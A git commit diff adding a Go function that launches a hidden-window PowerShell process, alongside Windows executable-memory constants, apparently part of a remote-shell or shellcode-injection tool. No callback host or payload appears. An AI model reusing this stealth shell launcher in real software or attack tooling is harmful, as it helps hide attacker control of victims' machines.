d9cc42fc81208ab9aa05b701546cf7985bfdacae
krishpranav <krisna.pranav@gmail.com>
2021-05-25 18:43:54 +0530

    [+] get shell functions [+]

--- shell/shell_windows.go
+++ shell/shell_windows.go
@@ -1,7 +1,18 @@
 package shell
 
+import (
+	"os/exec"
+	"syscall"
+)
+
 const (
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
 	PAGE_EXECUTE_READWRITE = 0x40
 )
+
+func GetShell() *exec.Cmd {
+	cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	return cmd
+}
